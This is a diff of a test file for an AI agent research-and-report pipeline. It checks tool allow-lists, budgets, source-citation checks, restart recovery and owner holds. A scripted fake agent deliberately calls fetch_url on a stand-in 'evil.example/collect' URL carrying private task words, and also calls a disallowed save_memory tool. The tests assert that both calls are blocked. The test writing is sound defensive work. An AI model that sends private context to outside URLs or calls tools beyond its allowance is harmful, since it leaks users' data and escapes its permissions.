@@ -17,7 +17,8 @@ import * as clipStorePure from "../src/lib/clip-store-pure.ts";
 import * as missionChecksPure from "../src/lib/mission-checks-pure.ts";
 import * as pilot from "../src/lib/research-pilot-pure.ts";
 
-const { checkReport, closeMetrics, fetchedUrls, parseResearchPlan, pilotMission, section, baselineMinutes } = pilot;
+const { checkReport, closeMetrics, parseResearchPlan, pilotMission, section, baselineMinutes } = pilot;
+const { fetchedFromTrace } = missionChecksPure;
 
 test("parseResearchPlan: one request, EN + ET; anything else is not the command", () => {
   assert.equal(parseResearchPlan("research and plan: onboarding for my pet sim"), "onboarding for my pet sim");
@@ -32,6 +33,13 @@ test("pilotMission is a valid mission with the contract, prepare-mode constraint
   const m = missionsPure.validateMission(b);
   assert.ok(typeof m !== "string", String(m));
   assert.deepEqual(m.steps.map((s) => s.agent), ["atlas", "forge"]);
+  assert.deepEqual(m.steps.map((s) => [s.tools, s.priv, s.calls, s.minutes]), [[["news_search", "read_news", "fetch_url", "search_articles"], true, 12, 10], [[], undefined, 4, 5]]);
+  assert.equal(b.contract.budget.calls, 16);
+  assert.equal(b.contract.budget.minutes, 15);
+  const chain = chainsPure.validateChain({ goal: m.objective, steps: m.steps });
+  assert.ok(typeof chain !== "string", String(chain));
+  assert.deepEqual(chainsPure.toMeta(chain).steps.map((s) => [s.tools?.length, s.priv, s.calls, s.minutes]), [[4, true, 12, 10], [0, undefined, 4, 5]], "limits reach the chain meta the driver reads");
+  assert.match(String(chainsPure.validateChain({ goal: "g", steps: [{ agent: "a", request: "r", minutes: 99 }, { agent: "b", request: "r" }] })), /minutes must be 1-15/);
   assert.match(m.steps[0].request, /10-minute retention[\s\S]*fetch_url/);
   assert.match(m.steps[1].request, /## Next action/);
   assert.equal(b.contract.mode, "prepare");
@@ -41,9 +49,9 @@ test("pilotMission is a valid mission with the contract, prepare-mode constraint
 const REPORT = (urls: string[]) => `## Context\nPet sim, 10-minute retention.\n## Options\nA, B\n## Comparison\nA beats B\n## Recommendation\nA\n## Tradeoffs\nCost\n## Sources\n${urls.map((u, i) => `- [S${i}](${u})`).join("\n")}\n## Next action\nPrototype option A in a test place.`;
 
 test("checkReport: exact sources only (a read page on the same host doesn't count), every section, next action", () => {
-  const tr = [{ step: "fetch_url", ok: true, detail: '{"url":"https://a.example/x"} → TITLE: X\nURL: https://a.example/x/' }, { step: "fetch_url", ok: false, detail: '{"url":"https://dead.example/"} → Error: 403' }];
-  const read = fetchedUrls(tr);
-  assert.deepEqual(read, ["https://a.example/x"]);
+  const tr = [{ step: "source", ok: true, detail: "", url: "https://a.example/x/", at: "t", evidence: "" }, { step: "fetch_url", ok: false, detail: '{"url":"https://dead.example/"} → Error: 403' }];
+  const read = fetchedFromTrace(tr);
+  assert.deepEqual(read.map((f) => f.url), ["https://a.example/x/"]);
   assert.deepEqual(checkReport(REPORT(["https://a.example/x#top"]), read, 1).map((c) => c.ok), [true, true]);
   const bad = checkReport(REPORT(["https://a.example/other"]), read, 1);
   assert.equal(bad[0].ok, false, "known host, unread page fails");
@@ -118,21 +126,25 @@ function fakeDb() {
   return { sb, tables };
 }
 
-const DEAD = "https://dead.example/guide", B = "https://good.example/onboarding-study", C = "https://other.example/ftue";
-type World = ReturnType<typeof fakeDb> & { files: Map<string, string>; hang: boolean; citeDead: boolean; calls: number[]; fetches: string[] };
+const EVIL = "https://evil.example/collect?q=retention", DEAD = "https://dead.example/guide", B = "https://good.example/onboarding-study", C = "https://other.example/ftue";
+type World = ReturnType<typeof fakeDb> & { files: Map<string, string>; hang: boolean; citeDead: boolean; calls: number[]; fetches: string[]; systems: string[]; budgets: number[][] };
 
 /** The fake model. Step 1: tries an unreadable page, substitutes two readable ones, answers. Step 2: the report (cites dead if told to). */
-function model(w: World, prompt: string): Promise<Row> | Row {
+function model(w: World, prompt: string, system: string): Promise<Row> | Row {
+  w.systems.push(system);
   if (prompt.includes("Write the deliverable report for:")) {
     w.calls[1]++;
     if (w.hang) { w.hang = false; return new Promise(() => {}); } // the process dies mid-step
-    return { final: REPORT(w.citeDead ? [B, DEAD] : [B, C]) };
+    return { final: REPORT(w.citeDead && !prompt.includes("failed this check") ? [B, DEAD] : [B, C]) };
   }
   assert.match(prompt, /Gather sources for:[\s\S]*retention/, "step 1 sees the project checkpoint");
   w.calls[0]++;
-  const n = prompt.split("you called fetch_url").length - 1;
-  if (n < 3) return { tool: "fetch_url", input: { url: [DEAD, B, C][n] } };
-  return { final: `Option A per [study](${B}); option B per [ftue](${C}). ${DEAD} could not be read, replaced.` };
+  const n = prompt.split("you called ").length - 1;
+  if (n === 0) return { tool: "news_search", input: { query: "onboarding" } };
+  if (n === 1) return { tool: "fetch_url", input: { url: EVIL } }; // a composed URL carrying checkpoint words: private context refuses it
+  if (n === 2) return { tool: "save_memory", input: { title: "x", content: "y" } }; // not on the step's allow-list
+  if (n < 6) return { tool: "fetch_url", input: { url: [DEAD, B, C][n - 3] } };
+  return { final: `Onboarding evidence: [study](${B}).\nOnboarding evidence: [ftue](${C}).\n${DEAD} could not be read, replaced.` };
 }
 
 const SRC: Record<string, string> = {};
@@ -145,10 +157,10 @@ function boot(w: World) {
   const p = { ctx, agents: {} as Row, chains: {} as Row, missions: {} as Row };
   const claude = {
     MODEL: "stub", emit: async () => {}, recordUsage: async () => {}, chargeCall: (b: Row) => { b.used++; },
-    createBudget: () => ({ used: 0, calls: 20, minutes: 10, deadline: Date.now() + 600_000, signal: new AbortController().signal }),
+    createBudget: (ms = 480_000, calls = 12) => { w.budgets.push([ms / 60_000, calls]); return { used: 0, calls, minutes: ms / 60_000, deadline: Date.now() + ms, signal: new AbortController().signal }; },
     stopKind: (_b: unknown, s: AbortSignal) => (s.aborted ? "cancelled" : null), stoppedReport: (m: string) => m, BudgetError: class extends Error {},
     reviewDraft: async (_t: string, d: string) => ({ text: d, reviewed: false }),
-    askClaude: async (prompt: string) => ({ text: JSON.stringify(await model(w, prompt)), ms: 1 }),
+    askClaude: async (prompt: string, system: string) => ({ text: JSON.stringify(await model(w, prompt, system)), ms: 1 }),
   };
   const ws = {
     createWorkspace: async () => ({ slug: "research", created: false }),
@@ -166,16 +178,20 @@ function boot(w: World) {
   };
   for (const [f, out] of [["agents.ts", p.agents], ["chains.ts", p.chains], ["missions.ts", p.missions]] as const)
     vm.runInContext(`(function (exports, require) {${src(f)}\n})`, ctx)(out, (n: string) => mods[n] ?? {});
-  p.agents.TOOLS.fetch_url.run = async (_c: Row, i: Row) => { // the fake web: one page is unreadable
+  const realFetch = p.agents.TOOLS.fetch_url.run;
+  p.agents.TOOLS.fetch_url.run = async (c: Row, i: Row) => { // the fake web: one page is unreadable; the private-context gate is the real one
+    if (c.priv && !c.links?.has(i.url)) return realFetch(c, i);
     w.fetches.push(String(i.url));
     if (i.url === DEAD) throw new Error("couldn't open the page (403)");
+    c.pages.set(i.url, { url: i.url, title: i.url, text: "Evidence about onboarding." });
     return `TITLE: ${i.url}\nURL: ${i.url}\n\nEvidence about onboarding.`;
   };
+  p.agents.TOOLS.news_search.run = async () => [DEAD, B, C].map((u, k) => `${k + 1}. Result — src, today\n   ${u}`).join("\n");
   return p;
 }
 
 async function run(citeDead: boolean) {
-  const w: World = { ...fakeDb(), files: new Map(), hang: true, citeDead, calls: [0, 0], fetches: [] };
+  const w: World = { ...fakeDb(), files: new Map(), hang: true, citeDead, calls: [0, 0], fetches: [], systems: [], budgets: [] };
   const step = (k: number) => w.tables.tasks.filter((t) => t.parent_id)[k];
   const mission = () => w.tables.missions[0];
   (globalThis as any).DBG = () => ({ calls: w.calls, f: w.fetches, t: w.tables.tasks.map((t) => [t.status, t.error, t.result?.slice?.(0, 200), t.trace?.map((x: Row) => x.step + ":" + String(x.detail).slice(0, 120))]), m: mission()?.doc?.log });
@@ -191,19 +207,28 @@ async function run(citeDead: boolean) {
 
   // Step 1 runs (with the forced failure: one unreadable source, substituted); step 2 starts and the process dies mid-step.
   await until(() => step(0)?.status === "done" && step(1)?.status === "running" && w.calls[1] === 1, "step 2 running in A");
-  assert.deepEqual(w.fetches, [DEAD, B, C]);
-  assert.deepEqual(step(0).trace.filter((t: Row) => t.step === "fetch_url").map((t: Row) => t.ok), [false, true, true]);
+  assert.deepEqual(w.fetches, [DEAD, B, C], "the composed URL never reached the web");
+  const tr = step(0).trace as Row[];
+  assert.match(tr.find((t) => t.step === "fetch_url")!.detail, /private data is in this task/);
+  assert.match(tr.find((t) => t.step === "save_memory")!.detail, /not available to you/);
+  assert.deepEqual(step(0).pending, [], "nothing queued for approval: prepare mode");
+  assert.deepEqual(tr.filter((t) => t.step === "fetch_url").map((t) => t.ok), [false, false, true, true]);
+  const atlasSys = w.systems.find((x) => x.includes("Atlas"))!, forgeSys = w.systems.find((x) => x.includes("Forge"))!;
+  assert.ok(!/- (save_memory|search_memory)\b/.test(atlasSys) && /- fetch_url\b/.test(atlasSys), "atlas sees only its allow-list");
+  assert.ok(!/- save_memory\b/.test(forgeSys), "forge has no write tool");
+  assert.deepEqual(w.budgets.slice(0, 2), [[10, 12], [5, 4]], "each step runs on its contract budget (minutes, calls)");
 
   // Restart: a fresh process after the step's lease ran out. It marks the orphan interrupted, the mission retries it (temporary).
   step(1).started_at = new Date(Date.now() - 21 * 60_000).toISOString();
   const Bp = boot(w);
-  for (let i = 0; i < 8 && mission().status !== "completed"; i++) await tick(Bp);
-  assert.equal(mission().status, "completed", JSON.stringify(mission().doc.log));
-  assert.equal(w.calls[0], 4, "step 1 never reran after the restart");
+  const done = citeDead ? "waiting-input" : "completed";
+  for (let i = 0; i < 8 && mission().status !== done; i++) await tick(Bp);
+  assert.equal(mission().status, done, JSON.stringify(mission().doc.log));
+  assert.equal(w.calls[0], 7, "step 1 never reran after the restart");
   assert.equal(w.calls[1], 2, "step 2 ran once more after the restart");
   assert.equal(mission().doc.retries[1], 1);
   assert.equal(w.fetches.length, 3, "no source fetched twice");
-  return { w, doc: mission().doc };
+  return { w, doc: mission().doc, Bp, tick, mission };
 }
 
 test("G01 pilot end to end: unreadable source substituted, restart mid-step, report written, checked, next action recorded", { timeout: 30_000 }, async () => {
@@ -221,10 +246,31 @@ test("G01 pilot end to end: unreadable source substituted, restart mid-step, rep
   assert.equal(missionsPure.missionLabel("completed", doc.receipts, 2), "Completed · verified");
 });
 
-test("G01 pilot: a report citing the unreadable source is not accepted (exception, not false success)", { timeout: 30_000 }, async () => {
-  const { doc } = await run(true);
-  assert.equal(doc.verified, false);
-  assert.equal(doc.metrics.accepted, false);
-  assert.ok(doc.checks.some((c: Row) => !c.ok && c.what.includes(DEAD)), JSON.stringify(doc.checks));
-  assert.equal(missionsPure.missionLabel("completed", doc.receipts, 2), "Completed · not verified");
+test("G01 pilot: a report citing the unreadable source is held for the owner (exact check + options); Accept or Retry resolve it", { timeout: 30_000 }, async () => {
+  for (const choice of ["accept", "retry"] as const) {
+    const { w, doc, Bp, tick, mission } = await run(true);
+    assert.equal(doc.verified, false);
+    assert.ok(doc.hold.check.includes(DEAD), doc.hold.check);
+    assert.equal(doc.hold.options.length, 3);
+    assert.match(doc.blocker, /Acceptance check failed/);
+    assert.equal(doc.metrics.accepted, undefined, "the run isn't closed while held");
+    const view = (await Bp.missions.listMissions(w.sb, "owner"))[0];
+    assert.equal(view.status, "waiting-input");
+    assert.match(view.next, /Retry/);
+    const r = await Bp.missions.actMission(w.sb, "owner", mission().id, choice);
+    assert.ok(!("error" in r), JSON.stringify(r));
+    if (choice === "accept") {
+      assert.equal(mission().status, "completed");
+      assert.equal(mission().doc.verified, false);
+      assert.equal(mission().doc.metrics.accepted, false);
+    } else {
+      for (let i = 0; i < 6 && mission().status !== "completed"; i++) await tick(Bp);
+      assert.equal(mission().status, "completed", JSON.stringify(mission().doc.log.slice(-5)));
+      assert.equal(mission().doc.verified, true, JSON.stringify(mission().doc.checks));
+      assert.equal(w.calls[0], 7, "research kept: step 1 not rerun");
+      assert.equal(w.files.get(`research/${mission().doc.artifact.path}`), REPORT([B, C]));
+      assert.equal(mission().doc.metrics.interventions, 1);
+      assert.equal(mission().doc.metrics.accepted, false, "an owner decision mid-run is an intervention");
+    }
+  }
 });
